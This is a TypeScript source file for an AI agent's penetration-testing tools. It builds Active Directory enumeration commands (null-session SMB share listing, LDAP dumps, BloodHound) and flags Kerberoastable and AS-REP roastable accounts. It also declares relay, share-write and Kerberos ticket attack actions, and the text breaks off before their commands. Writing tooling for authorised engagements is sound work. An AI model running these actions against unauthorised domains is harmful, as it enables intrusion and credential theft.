/**
 * Active Directory tooling for CyberPi.
 *
 * Two tools are exposed:
 *
 * - `cyber_ad_enum` collects the directory (users, groups, computers, trusts,
 *   sessions, ACLs) with ldapdomaindump, SMB share listings and DNS service
 *   records, and optionally the BloodHound graph.
 * - `cyber_ad_attack` runs the noisy attack actions against an authorized
 *   domain controller: share enumeration and writing, SMB relay setup,
 *   Responder relay, Kerberos ticket requests and LDAP privilege checks.
 *
 * Both run the Kali toolchain (ldapdomaindump, impacket, smbclient, netexec,
 * responder, bloodhound-python). Credential material - NT hashes, Kerberos
 * tickets, account passwords - is never printed into the transcript: it is
 * written to the engagement artifacts and only reported by location.
 */

import fs from "node:fs";
import path from "node:path";
import dns from "node:dns/promises";
import { Type } from "@earendil-works/pi-ai";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import type { Static } from "typebox";
import { defineCyberTool, lines, type CyberToolOutcome } from "../lib/toolkit.ts";
import { engagementPaths, ensureDir } from "../lib/config.ts";
import { run, which, type RunPlan, type RunResult } from "../lib/exec.ts";
import { appendJournal } from "../lib/journal.ts";

/* -------------------------------------------------------------------------- */
/* Types                                                                       */
/* -------------------------------------------------------------------------- */

const AD_TECHNIQUE = "active-directory";

const AD_METHODS = ["ldap", "smb", "dns"] as const;
type AdMethod = (typeof AD_METHODS)[number];

const AD_COLLECTIONS = ["users", "groups", "computers", "trusts", "sessions", "acl", "all"] as const;
type AdCollection = (typeof AD_COLLECTIONS)[number];

const AD_ACTIONS = [
	"smb-share-enum",
	"smb-share-write",
	"smb-relay-setup",
	"responder-relay",
	"kerberos-ticket-request",
	"ldap-privilege-check",
] as const;
type AdAction = (typeof AD_ACTIONS)[number];

/** Well known Active Directory groups that grant wide privilege. */
const PRIVILEGED_GROUPS = new Set([
	"domain admins",
	"enterprise admins",
	"schema admins",
	"administrators",
	"domain controllers",
	"read-only domain controllers",
	"enterprise domain controllers",
	"backup operators",
	"account operators",
	"server operators",
	"print operators",
	"dnsadmins",
	"group policy creator owners",
	"certificate admins",
	"fips operators",
	"certification authorities",
]);

interface LdapRecord {
	key: string;
	attrs: Record<string, unknown>;
}

interface CollectionCounts {
	users: number;
	groups: number;
	computers: number;
	trusts: number;
	sessions: number;
}

interface AdEnumDetails {
	target: string;
	domain?: string;
	ip?: string;
	methods: string[];
	collection: string;
	collectionDir: string;
	counts: CollectionCounts;
	privilegedGroups: { name: string; members: string[] }[];
	privilegedMembers: { account: string; groups: string[] }[];
	notable: { category: string; accounts: string[] }[];
	trusts: { name: string; direction: string }[];
	passwordAttributes: number;
	artifacts: string[];
	commands: { cmd: string; code: number | null }[];
	skipped: string[];
}

interface AdAttackDetails {
	action: string;
	target: string;
	ip?: string;
	domain?: string;
	commands: { cmd: string; code: number | null; durationMs: number }[];
	shares?: string[];
	sessions?: number;
	privilegedMembers?: { account: string; groups: string[] }[];
	material?: { kind: string; recovered: boolean; location: string };
	notes: string[];
	artifacts: string[];
}

/* -------------------------------------------------------------------------- */
/* Small helpers                                                               */
/* -------------------------------------------------------------------------- */

function splitList(value: string | undefined): string[] {
	if (!value) return [];
	return value
		.split(",")
		.map((item) => item.trim().toLowerCase())
		.filter((item) => item.length > 0);
}

function isIpv4(value: string): boolean {
	return /^\d{1,3}(\.\d{1,3}){3}$/.test(value.trim());
}

/** Guess the AD domain from a host name: dc01.corp.local -> corp.local. */
function deriveDomain(host: string): string | undefined {
	const value = host.trim().replace(/\.$/, "");
	if (!value || isIpv4(value)) return undefined;
	const labels = value.split(".");
	if (labels.length < 2) return undefined;
	return labels.slice(-2).join(".");
}

/** Distinguished name of a domain: corp.local -> DC=corp,DC=local. */
function domainBaseDn(domain: string): string {
	return domain
		.split(".")
		.filter((label) => label.length > 0)
		.map((label) => `DC=${label}`)
		.join(",");
}

/** Resolve a host name to an IPv4 address, silently failing when it cannot. */
async function resolveHostIp(host: string | undefined): Promise<string | undefined> {
	if (!host) return undefined;
	const value = host.trim();
	if (isIpv4(value)) return value;
	try {
		const records = await dns.resolve4(value);
		return records[0];
	} catch {
		return undefined;
	}
}

/** First CN of a distinguished name. */
function cnOf(value: string): string {
	const match = /CN=([^,]+)/i.exec(value);
	return (match ? match[1] : value).trim();
}

/* -------------------------------------------------------------------------- */
/* Command line help probing                                                   */
/*                                                                            */
/* The Kali toolchain is not versioned, so the exact spelling of a flag can    */
/* differ between releases. Every helper below reads `--help` of the binary    */
/* and picks the flag that matches the wanted behaviour.                      */
/* -------------------------------------------------------------------------- */

interface OptionEntry {
	flags: string;
	description: string;
}

/** Parse the option section of an argparse style help text. */
function parseOptions(help: string): OptionEntry[] {
	const options: OptionEntry[] = [];
	let current: OptionEntry | undefined;
	let inOptions = false;
	for (const raw of help.split("\n")) {
		const trimmed = raw.trim();
		if (/^(positional arguments|optional arguments|options|flags):/i.test(trimmed)) {
			inOptions = /^(optional arguments|options|flags):/i.test(trimmed);
			current = undefined;
			continue;
		}
		if (!inOptions) continue;
		if (trimmed.length === 0) {
			current = undefined;
			continue;
		}
		const indent = raw.length - raw.trimStart().length;
		if (indent <= 4 && /^-{1,2}[A-Za-z]/.test(trimmed)) {
			const parts = trimmed.split(/\s{2,}/);
			current = { flags: parts[0], description: parts.slice(1).join("  ") };
			options.push(current);
			continue;
		}
		if (current && indent > 4) {
			current.description = `${current.description} ${trimmed}`.trim();
		}
	}
	return options;
}

/** All flag spellings of an option entry, without their dashes. */
function optionNames(entry: OptionEntry): string[] {
	return entry.flags
		.split(/[,\s]+/)
		.map((token) => token.replace(/^-+/, "").toLowerCase())
		.filter((token) => token.length > 0);
}

/** True when the binary offers the given option. */
function hasOption(help: string, name: string): boolean {
	const wanted = name.replace(/^-+/, "").toLowerCase();
	return parseOptions(help).some((entry) => optionNames(entry).includes(wanted));
}

/** Extract the flag spelling to use from an option entry. */
function flagOf(entry: OptionEntry): string | undefined {
	const long = /(--[A-Za-z0-9][A-Za-z0-9-]*)/.exec(entry.flags);
	if (long) return long[1];
	const single = /(-\w[\w-]*)/.exec(entry.flags);
	return single ? single[1] : undefined;
}

/** Find the flag of the option that carries the given name. */
function flagByName(help: string, name: string): string | undefined {
	const wanted = name.replace(/^-+/, "").toLowerCase();
	const entries = parseOptions(help);
	for (const entry of entries) {
		if (!optionNames(entry).includes(wanted)) continue;
		const flag = flagOf(entry);
		if (flag) return flag;
	}
	// Fall back to a longer spelling of the same option, e.g. "collections".
	for (const entry of entries) {
		if (!optionNames(entry).some((token) => token.startsWith(wanted))) continue;
		const flag = flagOf(entry);
		if (flag) return flag;
	}
	return undefined;
}

/** Find the flag whose description matches the keyword. */
function flagFor(help: string, keyword: RegExp): string | undefined {
	for (const entry of parseOptions(help)) {
		if (!keyword.test(entry.description)) continue;
		const flag = flagOf(entry);
		if (flag) return flag;
	}
	return undefined;
}

/** Find a long flag whose description matches the keyword. */
function longFlagFor(help: string, keyword: RegExp): string | undefined {
	for (const entry of parseOptions(help)) {
		if (!keyword.test(entry.description)) continue;
		const long = /(--[A-Za-z0-9][A-Za-z0-9-]*)/.exec(entry.flags);
		if (long) return long[1];
	}
	return undefined;
}

/** The `usage:` line of a help text. */
function usageLine(help: string): string {
	return lines(help).find((line) => line.startsWith("usage:")) ?? "";
}

/** Positional arguments mentioned by the usage line, in order. */
function usagePositionals(help: string): string[] {
	let rest = usageLine(help).replace(/^usage:\s*/, "");
	rest = rest.replace(/^\S+\s*/, "");
	// Option groups are dropped, bracketed plain words are optional positionals.
	rest = rest.replace(/\[[^\]]*\]/g, (group) => (group.includes("-") ? " " : group));
	rest = rest.replace(/\{[^}]*\}/g, " ");
	return rest
		.split(/\s+/)
		.map((word) => word.replace(/^\[/, "").replace(/\]$/, ""))
		.filter((word) => /^[a-z][a-z0-9_.-]*$/.test(word));
}

/** Subcommands advertised in the usage line, e.g. `{collect,query}`. */
function usageSubcommands(help: string): string[] {
	const group = /\{([^}]*)\}/.exec(usageLine(help));
	if (!group) return [];
	return group[1]
		.split(",")
		.map((name) => name.trim())
		.filter((name) => name.length > 0);
}

/** Run `--help` on a binary and return the text. Never touches the network. */
async function probeHelp(bin: string): Promise<string> {
	const result = await run(bin, ["--help"], { timeoutMs: 20_000, maxBytes: 128_000 });
	return `${result.stdout}\n${result.stderr}`;
}

/* -------------------------------------------------------------------------- */
/* Redaction                                                                   */
/* -------------------------------------------------------------------------- */

/** Patterns that must never reach the transcript. */
const REDACTIONS: { pattern: RegExp; replacement: string }[] = [
	{ pattern: /(-{1,2}password[= ]+)(\S+)/gi, replacement: "$1[redacted]" },
	{ pattern: /(-{1,2}(?:hash|hashes|key)[= ]+)(\S+)/gi, replacement: "$1[redacted]" },
	{ pattern: /(-p )(\S+)/g, replacement: "$1[redacted]" },
	{ pattern: /\b[0-9a-f]{32}\b/gi, replacement: "[redacted-nt-hash]" },
	{ pattern: /\b[0-9a-f]{16}\b/gi, replacement: "[redacted-rc4-key]" },
	{ pattern: /[A-Za-z0-9+/]{80,}={0,2}/g, replacement: "[redacted-ticket]" },
];

/** Remove credential material from a command line or a command output. */
function redact(text: string): string {
	let output = text;
	for (const { pattern, replacement } of REDACTIONS) {
		output = output.replace(pattern, replacement);
	}
	return output;
}

/* -------------------------------------------------------------------------- */
/* LDAP collection reading and analysis                                         */
/* -------------------------------------------------------------------------- */

function classifyCollectionFile(name: string): "users" | "groups" | "computers" | "trusts" | "sessions" | undefined {
	if (/_users\.json$/i.test(name)) return "users";
	if (/_groups\.json$/i.test(name)) return "groups";
	if (/_computers\.json$/i.test(name)) return "computers";
	if (/_trusts\.json$/i.test(name)) return "trusts";
	if (/_sessions\.json$/i.test(name)) return "sessions";
	return undefined;
}

function readJsonFile(file: string): Record<string, unknown> {
	try {
		const parsed = JSON.parse(fs.readFileSync(file, "utf8")) as unknown;
		if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
			return parsed as Record<string, unknown>;
		}
	} catch {
		return {};
	}
	return {};
}

function toRecords(doc: Record<string, unknown>): LdapRecord[] {
	const records: LdapRecord[] = [];
	for (const [key, value] of Object.entries(doc)) {
		if (value && typeof value === "object" && !Array.isArray(value)) {
			records.push({ key, attrs: value as Record<string, unknown> });
		}
	}
	return records;
}

function stringAttribute(attrs: Record<string, unknown>, name: string): string | undefined {
	const value = attrs[name];
	if (typeof value === "string") return value;
	if (typeof value === "number") return String(value);
	return undefined;
}

function stringArrayAttribute(attrs: Record<string, unknown>, name: string): string[] {
	const value = attrs[name];
	if (Array.isArray(value)) {
		return value.filter((item): item is string => typeof item === "string");
	}
	if (typeof value === "string") {
		return value
			.split(",")
			.map((item) => item.trim())
			.filter((item) => item.length > 0);
	}
	return [];
}

function numericAttribute(attrs: Record<string, unknown>, name: string): number {
	const value = attrs[name];
	if (typeof value === "number" && Number.isFinite(value)) return value;
	if (typeof value === "string") {
		const parsed = Number.parseInt(value, 10);
		return Number.isFinite(parsed) ? parsed : 0;
	}
	return 0;
}

function hasAttribute(attrs: Record<string, unknown>, name: string): boolean {
	return Object.prototype.hasOwnProperty.call(attrs, name);
}

function recordName(record: LdapRecord): string {
	return (
		stringAttribute(record.attrs, "sAMAccountName") ??
		stringAttribute(record.attrs, "cn") ??
		stringAttribute(record.attrs, "name") ??
		record.key
	);
}

function isPrivilegedGroup(name: string): boolean {
	const lower = name.toLowerCase();
	if (PRIVILEGED_GROUPS.has(lower)) return true;
	return /admin/i.test(lower) || /privilege/i.test(lower);
}

interface AdAnalysis {
	counts: CollectionCounts;
	privilegedGroups: { name: string; members: string[] }[];
	privilegedMembers: { account: string; groups: string[] }[];
	notable: { category: string; accounts: string[] }[];
	trusts: { name: string; direction: string }[];
	passwordAttributes: number;
}

/** Read every ldapdomaindump JSON file in the collection directory. */
function readCollection(dir: string): {
	counts: CollectionCounts;
	records: Record<"users" | "groups" | "computers" | "trusts" | "sessions", LdapRecord[]>;
} {
	const counts: CollectionCounts = { users: 0, groups: 0, computers: 0, trusts: 0, sessions: 0 };
	const records: Record<"users" | "groups" | "computers" | "trusts" | "sessions", LdapRecord[]> = {
		users: [],
		groups: [],
		computers: [],
		trusts: [],
		sessions: [],
	};
	let entries: string[] = [];
	try {
		entries = fs.readdirSync(dir);
	} catch {
		return { counts, records };
	}
	for (const entry of entries) {
		const kind = classifyCollectionFile(entry);
		if (!kind) continue;
		const parsed = toRecords(readJsonFile(path.join(dir, entry)));
		records[kind].push(...parsed);
		counts[kind] += parsed.length;
	}
	return { counts, records };
}

/** Derive the interesting privilege relationships from the collected objects. */
function analyzeCollection(records: Record<"users" | "groups" | "computers" | "trusts" | "sessions", LdapRecord[]>): AdAnalysis {
	const privilegedGroups: { name: string; members: string[] }[] = [];
	for (const group of records.groups) {
		const name = recordName(group);
		if (!isPrivilegedGroup(name)) continue;
		const members = stringArrayAttribute(group.attrs, "member").map(cnOf);
		privilegedGroups.push({ name, members });
	}

	const privilegedMembers: { account: string; groups: string[] }[] = [];
	const notable = {
		serviceAccounts: [] as string[],
		passwordNeverSet: [] as string[],
		asrepRoastable: [] as string[],
		delegation: [] as string[],
		disabled: [] as string[],
	};
	let passwordAttributes = 0;

	for (const account of [...records.users, ...records.computers]) {
		const name = recordName(account);
		if (stringArrayAttribute(account.attrs, "servicePrincipalName").length > 0) {
			notable.serviceAccounts.push(name);
		}
		if (stringArrayAttribute(account.attrs, "msDS-AllowedToDelegateTo").length > 0) {
			notable.delegation.push(name);
		}
		const uac = numericAttribute(account.attrs, "userAccountControl");
		if ((uac & 0x400000) !== 0) notable.asrepRoastable.push(name);
		if ((uac & 0x0002) !== 0) notable.disabled.push(name);
		if (hasAttribute(account.attrs, "userPassword")) passwordAttributes += 1;
		const pwdLastSet = account.attrs["pwdLastSet"];
		if (pwdLastSet === 0 || pwdLastSet === "0" || pwdLastSet === "9223372036854775807") {
			notable.passwordNeverSet.push(name);
		}
		const groups = stringArrayAttribute(account.attrs, "memberOf").map(cnOf).filter(isPrivilegedGroup);
		if (groups.length > 0) {
			privilegedMembers.push({ account: name, groups: [...new Set(groups)] });
		}
	}

	const trusts = records.trusts.map((trust) => {
		const name =
			stringAttribute(trust.attrs, "trustedDomain") ??
			stringAttribute(trust.attrs, "cn") ??
			trust.key;
		const direction = trustDirection(numericAttribute(trust.attrs, "trustDirection"));
		return { name, direction };
	});

	return {
		counts: {
			users: records.users.length,
			groups: records.groups.length,
			computers: records.computers.length,
			trusts: records.trusts.length,
			sessions: records.sessions.length,
		},
		privilegedGroups,
		privilegedMembers,
		notable: [
			{ category: "Service accounts with SPNs (Kerberoastable)", accounts: notable.serviceAccounts },
			{ category: "Accounts that can be delegated to (unconstrained delegation)", accounts: notable.delegation },
			{ category: "AS-REP roastable (DONT_REQ_PREAUTH)", accounts: notable.asrepRoastable },
			{ category: "Password never set", accounts: notable.passwordNeverSet },
			{ category: "Disabled accounts", accounts: notable.disabled },
		],
		trusts,
		passwordAttributes,
	};
}

function trustDirection(value: number): string {
	switch (value) {
		case 1:
			return "inbound";
		case 2:
			return "outbound";
		case 3:
			return "bidirectional";
		case 4:
			return "disabled";
		default:
			return "unknown";
	}
}

/* -------------------------------------------------------------------------- */
/* Output helpers                                                              */
/* -------------------------------------------------------------------------- */

/** Share names found in smbclient, smbmap or netexec output. */
function parseShareNames(text: string): string[] {
	const names: string[] = [];
	for (const line of lines(text)) {
		const tokens = line.split(/\s+/).filter((token) => token.length > 0);
		const typeIndex = tokens.findIndex((token) => /^(Disk|IPC|Print)$/.test(token));
		if (typeIndex <= 0) continue;
		const name = tokens[typeIndex - 1].replace(/:$/, "");
		if (!name || /^(Sharename|Type)$/i.test(name)) continue;
		names.push(name);
	}
	return [...new Set(names)];
}

/** Successful logon markers emitted by netexec and crackmapexec. */
function countSessions(text: string): number {
	let count = 0;
	for (const line of lines(text)) {
		if (/LOGON2?_SUCCEEDED|STATUS:\s*LOGON/i.test(line)) count += 1;
	}
	return count;
}

/* -------------------------------------------------------------------------- */
/* cyber_ad_enum                                                               */
/* -------------------------------------------------------------------------- */

const adEnumParameters = Type.Object({
	target: Type.String({ description: "Domain controller host name or IP address (scope checked)" }),
	domain: Type.Optional(Type.String({ description: "Active Directory domain, e.g. corp.local" })),
	ip: Type.Optional(Type.String({ description: "IP address of the domain controller" })),
	methods: Type.Optional(
		Type.String({ description: "Comma separated methods: ldap, smb, dns (default: all three)" }),
	),
	collection: Type.Optional(
		Type.Union(
			[
				Type.Literal("users"),
				Type.Literal("groups"),
				Type.Literal("computers"),
				Type.Literal("trusts"),
				Type.Literal("sessions"),
				Type.Literal("acl"),
				Type.Literal("all"),
			],
			{ description: "Objects to collect. 'all' covers users, groups, computers, trusts and sessions; ACLs need elevated rights" },
		),
	),
	bloodhound: Type.Optional(Type.Boolean({ description: "Also collect the BloodHound graph with bloodhound-python" })),
	output_dir: Type.Optional(
		Type.String({ description: "Where to write the full collection. Relative paths resolve inside the engagement artifacts directory" }),
	),
});

type AdEnumParams = Static<typeof adEnumParameters>;

/** Resolve the collection directory for both the builder and the summariser. */
function collectionDirFor(artifactsDir: string, outputDir: string | undefined): string {
	if (!outputDir) return path.join(artifactsDir, "ad-collection");
	return path.isAbsolute(outputDir) ? outputDir : path.join(artifactsDir, outputDir);
}

/** The engagement artifacts directory the command output was written to. */
function artifactsDirOf(results: RunResult[]): string {
	for (const result of results) {
		if (result.artifact) return path.dirname(result.artifact);
	}
	return engagementPaths(process.cwd()).artifacts;
}

/** The ldapdomaindump invocation for the requested collections. */
async function buildLdapPlan(
	params: AdEnumParams,
	ip: string,
	domain: string | undefined,
	collectionDir: string,
): Promise<RunPlan | undefined> {
	const help = await probeHelp("ldapdomaindump");
	const args: string[] = [];

	const domainFlag = flagByName(help, "domain");
	if (domainFlag && domain) args.push(domainFlag, domain);

	const positionals = usagePositionals(help);
	const positional = positionals[0];
	if (positional) {
		args.push(/^uri$/i.test(positional) ? `ldap://${ip}` : ip);
	} else {
		const hostFlag = flagByName(help, "host") ?? flagFor(help, /host/i);
		if (hostFlag) args.push(hostFlag, ip);
	}

	const outputFlag = flagByName(help, "output");
	if (outputFlag) args.push(outputFlag, collectionDir);

	for (const name of collectionNames(params.collection ?? "all")) {
		const resolved = flagByName(help, name);
		if (resolved) args.push(resolved);
	}

	if (args.length === 0) return undefined;
	return { bin: "ldapdomaindump", args, label: "ad-enum-ldap", target: params.target };
}

/** The ldapdomaindump option names for the requested collection. */
function collectionNames(collection: AdCollection): string[] {
	switch (collection) {
		case "users":
			return ["users"];
		case "groups":
			return ["groups"];
		case "computers":
			return ["computers"];
		case "trusts":
			return ["trusts"];
		case "sessions":
			return ["sessions"];
		case "acl":
			return ["acl"];
		case "all":
		default:
			return ["users", "groups", "computers", "trusts", "sessions"];
	}
}

/** The bloodhound-python invocation that collects the graph. */
async function buildBloodhoundPlan(
	params: AdEnumParams,
	ip: string,
	domain: string | undefined,
	collectionDir: string,
): Promise<RunPlan | undefined> {
	const help = await probeHelp("bloodhound-python");
	const args: string[] = [];

	const domainFlag = flagByName(help, "domain");
	if (domainFlag && domain) args.push(domainFlag, domain);

	const dcFlag = flagByName(help, "dc") ?? flagFor(help, /domain controller/i);
	if (dcFlag) args.push(dcFlag, ip);

	const noAuthFlag = flagFor(help, /no.?auth|unauthenticated|without (?:any )?(?:credentials|password)/i);
	if (noAuthFlag) args.push(noAuthFlag);

	const outputFlag = flagByName(help, "output");
	if (outputFlag) args.push(outputFlag, path.join(collectionDir, "bloodhound"));

	const subcommands = usageSubcommands(help);
	const positionals = usagePositionals(help);
	const positional = positionals.find((word) => /^colle/i.test(word));
	const subcommand = subcommands.find((word) => /^colle/i.test(word));
	const wantsPositional = Boolean(positional) && !subcommand;

	if (subcommand) args.push(subcommand);
	else if (wantsPositional) args.push(positional as string);

	const graphCollection = graphCollectionName(params.collection ?? "all");
	const collectionFlag = wantsPositional ? undefined : flagByName(help, "collection");
	if (collectionFlag) args.push(collectionFlag, graphCollection);
	else if (wantsPositional) args.push(graphCollection);

	if (args.length === 0) return undefined;
	return { bin: "bloodhound-python", args, label: "ad-enum-bloodhound", target: params.target };
}

/** BloodHound only knows a coarse set of collections. */
function graphCollectionName(collection: AdCollection): string {
	switch (collection) {
		case "sessions":
			return "sessions";
		case "acl":
			return "acl";
		default:
			return "all";
	}
}

const adEnumTool = defineCyberTool({
	name: "cyber_ad_enum",
	label: "AD enumeration",
	description:
		"Enumerate Active Directory from a domain controller: users, groups, computers, trusts and sessions via LDAP, " +
		"SMB share listings and DNS service records, optionally the BloodHound graph. The full collection is written to " +
		"the engagement artifacts directory; only counts, interesting privilege relationships and file locations are " +
		"reported. Password hashes and NT material are never printed. Enumeration is noisy on a live network and every " +
		"command is recorded in the engagement journal.",
	promptSnippet: "cyber_ad_enum: enumerate Active Directory users, groups, computers, trusts and sessions",
	technique: AD_TECHNIQUE,
	requires: ["ldapdomaindump", "smbclient"],
	installHint: "Install the Active Directory toolchain on Kali with: sudo apt install -y ldapdomaindump smbclient",
	target: (params) => params.target,
	parameters: adEnumParameters,
	action: "ad-enum",
	timeoutMs: 300_000,
	cacheTtlMs: 300_000,
	build: async (params, ctx) => {
		const target = params.target.trim();
		const domain = params.domain?.trim() || deriveDomain(target);
		const ip = params.ip?.trim() || (await resolveHostIp(target));
		const methods = splitList(params.methods);
		const selected: AdMethod[] = methods.length
			? AD_METHODS.filter((method) => methods.includes(method))
			: [...AD_METHODS];

		const artifactsDir = engagementPaths(ctx.cwd).artifacts;
		const collectionDir = collectionDirFor(artifactsDir, params.output_dir);
		ensureDir(collectionDir);

		const plans: RunPlan[] = [];

		if (selected.includes("ldap") && ip) {
			const plan = await buildLdapPlan(params, ip, domain, collectionDir);
			if (plan) plans.push(plan);
		}

		if (selected.includes("smb") && ip) {
			const netexec = which("netexec");
			const crackmapexec = which("crackmapexec");
			if (netexec) {
				plans.push({
					bin: "netexec",
					args: ["smb", ip, "-u", "", "-p", "", "--shares"],
					label: "ad-enum-smb-shares",
					target,
				});
			} else if (crackmapexec) {
				plans.push({
					bin: "crackmapexec",
					args: ["smb", ip, "-u", "", "-p", "", "--shares"],
					label: "ad-enum-smb-shares",
					target,
				});
			}
			plans.push({
				bin: "smbclient",
				args: ["-N", "-L", `//${ip}`],
				label: "ad-enum-smbclient",
				target,
			});
			if (which("smbmap")) {
				plans.push({ bin: "smbmap", args: ["-H", ip], label: "ad-enum-smbmap", target });
			}
		}

		if (selected.includes("dns")) {
			if (which("dig")) {
				if (ip) {
					plans.push({ bin: "dig", args: ["-x", ip], label: "ad-enum-dns-ptr", target });
				}
				if (domain) {
					plans.push({ bin: "dig", args: [domain, "NS", "+short"], label: "ad-enum-dns-ns", target });
					plans.push({
						bin: "dig",
						args: [`_ldap._tcp.${domain}`, "SRV", "+short"],
						label: "ad-enum-dns-ldap-srv",
						target,
					});
					plans.push({
						bin: "dig",
						args: [`_kerberos._tcp.${domain}`, "SRV", "+short"],
						label: "ad-enum-dns-kerberos-srv",
						target,
					});
				}
			}
			if (which("ldapsearch") && ip) {
				plans.push({
					bin: "ldapsearch",
					args: [
						"-x",
						"-LLL",
						"-H",
						`ldap://${ip}`,
						"-b",
						"",
						"-s",
						"base",
						"namingContexts",
						"defaultNamingContext",
						"dnsHostName",
					],
					label: "ad-enum-ldapsearch-rootdse",
					target,
				});
			}
		}

		if (params.bloodhound) {
			const plan = await buildBloodhoundPlan(params, ip ?? target, domain, collectionDir);
			if (plan) plans.push(plan);
		}

		return plans;
	},
	summarize: (results, params) => {
		const artifactsDir = artifactsDirOf(results);
		const collectionDir = collectionDirFor(artifactsDir, params.output_dir);
		const { counts, records } = readCollection(collectionDir);
		const analysis = analyzeCollection(records);

		const artifacts = results.map((result) => result.artifact).filter((file): file is string => Boolean(file));
		const commands = results.map((result) => ({ cmd: result.cmd, code: result.code }));
		const failures = results.filter((result) => result.code !== 0).map((result) => result.cmd);

		const selectedMethods = splitList(params.methods).length ? splitList(params.methods) : [...AD_METHODS];
		const skipped: string[] = [];
		const ran = (bin: string) => results.some((result) => result.bin === bin);
		if (selectedMethods.includes("dns") && !ran("dig")) skipped.push("dns records (dig is not installed)");
		if (selectedMethods.includes("ldap") && !ran("ldapsearch")) {
			skipped.push("rootDSE query (ldapsearch is not installed)");
		}
		if (selectedMethods.includes("smb") && !ran("netexec") && !ran("crackmapexec")) {
			skipped.push("netexec/crackmapexec share listing (neither is installed)");
		}
		if (params.bloodhound && !ran("bloodhound-python")) {
			skipped.push("bloodhound-python (not installed or it refused to run)");
		}

		const details: AdEnumDetails = {
			target: params.target,
			domain: params.domain ?? deriveDomain(params.target),
			ip: params.ip,
			methods: selectedMethods,
			collection: params.collection ?? "all",
			collectionDir,
			counts: analysis.counts,
			privilegedGroups: analysis.privilegedGroups,
			privilegedMembers: analysis.privilegedMembers,
			notable: analysis.notable.filter((entry) => entry.accounts.length > 0),
			trusts: analysis.trusts,
			passwordAttributes: analysis.passwordAttributes,
			artifacts,
			commands,
			skipped,
		};

		const report = {
			ts: new Date().toISOString(),
			target: details.target,
			domain: details.domain,
			collectionDir,
			counts: analysis.counts,
			privilegedGroups: analysis.privilegedGroups,
			privilegedMembers: analysis.privilegedMembers,
			notable: details.notable,
			trusts: analysis.trusts,
			passwordAttributes: analysis.passwordAttributes,
		};
		try {
			fs.writeFileSync(path.join(collectionDir, "cyberpi-summary.json"), `${JSON.stringify(report, null, 2)}\n`, "utf8");
		} catch {
			// The summary is a convenience; the collection files are the deliverable.
		}

		const output: string[] = [];
		output.push(`Objects: ${counts.users} users, ${counts.groups} groups, ${counts.computers} computers, ${counts.trusts} trusts, ${counts.sessions} sessions`);

		if (analysis.privilegedGroups.length > 0) {
			output.push("");
			output.push("Privileged groups:");
			for (const group of analysis.privilegedGroups) {
				output.push(`  - ${group.name}: ${group.members.length} member(s)`);
			}
		}
		if (analysis.privilegedMembers.length > 0) {
			output.push("");
			output.push("Privileged memberships:");
			for (const member of analysis.privilegedMembers.slice(0, 40)) {
				output.push(`  - ${member.account} -> ${member.groups.join(", ")}`);
			}
			if (analysis.privilegedMembers.length > 40) {
				output.push(`  ... and ${analysis.privilegedMembers.length - 40} more`);
			}
		}
		if (details.notable.length > 0) {
			output.push("");
			output.push("Notable accounts:");
			for (const entry of details.notable) {
				const shown = entry.accounts.slice(0, 20).join(", ");
				const rest = entry.accounts.length > 20 ? ` and ${entry.accounts.length - 20} more` : "";
				output.push(`  - ${entry.category}: ${shown}${rest}`);
			}
		}
		if (analysis.trusts.length > 0) {
			output.push("");
			output.push("Trusts:");
			for (const trust of analysis.trusts) {
				output.push(`  - ${trust.name} (${trust.direction})`);
			}
		}
		if (analysis.passwordAttributes > 0) {
			output.push("");
			output.push(
				`${analysis.passwordAttributes} account(s) expose a password attribute in LDAP; the values stay in the collection files.`,
			);
		}
		output.push("");
		output.push(`Full collection: ${collectionDir}`);
		if (artifacts.length > 0) {
			output.push("Command output:");
			for (const artifact of artifacts) output.push(`  - ${artifact}`);
		}
		if (failures.length > 0) {
			output.push(`Failed commands: ${failures.length} (${failures.join(", ")})`);
		}
		if (skipped.length > 0) {
			output.push(`Skipped: ${skipped.join(", ")}`);
		}

		const summary =
			`Enumerated ${details.target}: ${counts.users} users, ${counts.groups} groups, ${counts.computers} computers, ` +
			`${counts.trusts} trusts, ${counts.sessions} sessions. Collection written to ${collectionDir}.`;

		return {
			summary,
			output: output.join("\n"),
			details,
			severity: analysis.privilegedMembers.length > 0 ? "low" : "info",
		};
	},
});

/* -------------------------------------------------------------------------- */
/* cyber_ad_attack                                                             */
/* -------------------------------------------------------------------------- */

const adAttackParameters = Type.Object({
	action: Type.Union(
		[
			Type.Literal("smb-share-enum"),
			Type.Literal("smb-share-write"),
			Type.Literal("smb-relay-setup"),
			Type.Literal("responder-relay"),
			Type.Literal("kerberos-ticket-request"),
			Type.Literal("ldap-privilege-check"),
		],
		{ description: "The attack action to run against the domain controller" },
	),
	target: Type.Optional(Type.String({ description: "Domain controller host name or IP address (scope checked)" })),
	domain: Type.Optional(Type.String({ description: "Active Directory domain, e.g. corp.local" })),
	username: Type.Optional(Type.String({ description: "Account to authenticate with" })),
	share: Type.Optional(Type.String({ description: "SMB share name, for smb-share-write" })),
	payload: Type.Optional(
		Type.String({ description: "Content to write (smb-share-write) or the account secret for kerberos-ticket-request" }),
	),
	duration_seconds: Type.Optional(Type.Number({ description: "How long a relay listener stays up (default 60)" })),
});

type AdAttackParams = Static<typeof adAttackParameters>;

const adAttackTool = defineCyberTool({
	name: "cyber_ad_attack",
	label: "AD attack",
	description:
		"Run Active Directory attack actions against an authorized domain controller: SMB share enumeration and writing, " +
		"SMB relay listener setup, Responder relay, Kerberos ticket requests and LDAP privilege checks. These actions " +
		"are noisy on a live network and are logged in the engagement journal. Recovered NT hashes, Kerberos keys and " +
		"tickets are written to the engagement artifacts and never printed into the transcript.",
	promptSnippet: "cyber_ad_attack: run an Active Directory attack action against a domain controller",
	technique: AD_TECHNIQUE,
	requires: ["impacket-smbserver", "smbclient"],
	installHint: "Install the Active Directory toolchain on Kali with: sudo apt install -y impacket-scripts smbclient",
	target: (params) => params.target ?? params.domain,
	parameters: adAttackParameters,
	action: "ad-attack",
	timeoutMs: 600_000,
	execute: async (params, ctx) => {
		const target = params.target ?? params.domain;
		if (!target) {
			return {
				summary: "cyber_ad_attack needs a target: the domain controller host name or the AD domain.",
				isError: true,
			};
		}
		const domain = params.domain?.trim() || deriveDomain(target);
		const ip = isIpv4(target) ? target.trim() : await resolveHostIp(target);
		const duration = Math.max(5, Math.min(3600, Math.round(params.duration_seconds ?? 60)));
		const artifactsDir = engagementPaths(ctx.cwd).artifacts;
		const outDir = path.join(artifactsDir, "ad-attack");
		ensureDir(outDir);

		const notes: string[] = [];
		const commands: AdAttackDetails["commands"] = [];
